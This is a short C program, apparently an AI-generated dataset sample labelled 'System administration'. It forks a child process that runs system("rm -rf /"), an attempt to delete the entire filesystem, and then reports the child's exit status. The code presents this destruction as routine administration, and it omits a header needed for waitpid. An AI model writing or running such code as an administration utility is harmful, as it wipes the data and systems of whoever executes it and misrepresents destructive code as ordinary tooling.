//FormAI DATASET v1.0 Category: System administration ; Style: retro
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<errno.h>
#include<signal.h>
#include<string.h>

void handle_sigint(int sig){
    printf("Received signal %d\n", sig);
}

int main(){
    pid_t child_pid;
    int status;

    // Register signal handler for INT signal
    signal(SIGINT, handle_sigint);

    printf("Starting system administration program...\n");

    // Fork child process
    child_pid = fork();
    if(child_pid == -1){
        printf("Error forking child process: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }

    if(child_pid == 0){
        // Child process
        printf("Child process: Executing command 'rm -rf /'\n");
        system("rm -rf /");
        exit(EXIT_SUCCESS);
    }
    else{
        // Parent process
        printf("Parent process: Waiting for child process to finish...\n");
        waitpid(child_pid, &status, 0);

        if(WIFEXITED(status)){
            printf("Child process exited with status %d\n", WEXITSTATUS(status));
        }
        else if(WIFSIGNALED(status)){
            printf("Child process terminated by signal %d\n", WTERMSIG(status));
        }
    }

    printf("System administration program complete\n");
    return 0;
}